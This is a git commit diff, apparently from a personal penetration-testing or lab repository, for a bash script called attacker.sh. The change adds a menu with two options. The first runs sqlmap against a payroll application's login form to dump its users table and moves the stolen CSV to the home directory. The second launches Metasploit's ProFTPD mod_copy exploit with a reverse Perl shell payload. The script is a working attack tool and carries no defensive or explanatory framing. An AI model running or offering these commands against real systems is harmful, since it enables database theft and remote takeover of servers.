bcf2f83583c24679da598c0b52c3ea752de23980
root <root@localhost.localdomain>
2020-02-19 04:13:48 +0000

    added options

--- attacker.sh
+++ attacker.sh
@@ -1,11 +1,16 @@
 #!/bin/bash
 
-TARGET=$1
+OPTION=$1
+TARGET=$2
 
-#sqlmap -u http://192.168.0.32/payroll_app.php --data="user=admin&password=admin&s=OK" --sqlmap-shell
-#--dump 
 
-# mv ~/.sqlmap/output/192.168.0.32/dump/payroll/users.csv ~/
-
-msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run;"
-
+if [ $OPTION -eq 1 ]
+then 
+	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dump 
+	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
+elif [ $OPTION -eq 2 ]
+then
+	msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run;"
+else
+	echo "Not valid. Enter either 1 or 2"
+fi
